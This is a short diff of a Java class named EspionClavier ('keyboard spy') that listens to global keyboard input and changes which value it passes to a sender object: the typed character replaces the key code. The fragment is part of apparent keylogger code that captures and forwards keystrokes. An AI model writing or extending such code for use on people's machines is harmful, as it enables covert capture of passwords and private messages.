@@ -37,7 +37,7 @@ public class EspionClavier implements NativeKeyListener{
     @Override
     public void nativeKeyTyped(NativeKeyEvent nke) {
         System.out.println("Key typed : "+NativeInputEvent.getModifiersText(nke.getModifiers()) + " " + nke.getKeyChar());
-        this.sender.sendKeyTyped(nke.getKeyCode());
+        this.sender.sendKeyTyped(nke.getKeyChar());
     }
     
 }
